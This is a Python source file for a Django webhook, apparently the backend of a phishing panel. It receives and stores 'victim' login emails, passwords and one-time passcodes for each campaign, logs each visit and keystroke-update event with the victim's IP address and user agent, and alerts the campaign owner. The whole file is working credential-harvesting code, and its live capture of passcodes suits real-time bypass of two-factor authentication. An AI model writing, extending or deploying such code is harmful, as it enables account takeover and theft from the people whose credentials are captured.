from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse, HttpResponseBadRequest
from django.views.decorators.http import require_POST
import json
from .models import Campaign, VictimInfo, VictimEvent  # Added VictimEvent import
from accounts.models import CustomUser
from .views import send_victim_info_notification

@csrf_exempt
@require_POST
def webhook_victim_info(request, campaign_id):
    """
    Webhook endpoint to receive victim info for a specific campaign.
    Accepts partial data: only writes fields it receives.
    Merges all data into a single VictimInfo per campaign.
    """
    try:
        data = json.loads(request.body.decode('utf-8'))
    except json.JSONDecodeError:
        return HttpResponseBadRequest('Invalid payload')

    try:
        campaign = Campaign.objects.get(id=campaign_id)
    except Campaign.DoesNotExist:
        return JsonResponse({'error': 'Campaign not found'}, status=404)

    # Try to get existing VictimInfo for this campaign
    victim_info, created = VictimInfo.objects.get_or_create(
        campaign=campaign,
        defaults={'user': campaign.user}
    )

    # Log a 'visit' event if this is the first time
    if created:
        VictimEvent.objects.create(
            campaign=campaign,
            event_type='visit',
            ip_address=request.META.get('REMOTE_ADDR'),
            user_agent=request.META.get('HTTP_USER_AGENT', '')
        )

    updated = False
    for field in ['login_email', 'login_password', 'login_otp']:
        if field in data:
            setattr(victim_info, field, data[field])
            updated = True
    if updated:
        victim_info.save()
        # Log a 'typing' event whenever data is updated
        VictimEvent.objects.create(
            campaign=campaign,
            event_type='typing',
            ip_address=request.META.get('REMOTE_ADDR'),
            user_agent=request.META.get('HTTP_USER_AGENT', '')
        )
        # Notify campaign owner
        send_victim_info_notification(campaign, victim_info, request)

    return JsonResponse({
        'status': 'success',
        'victim_info_id': str(victim_info.id),
        'created': created
    })
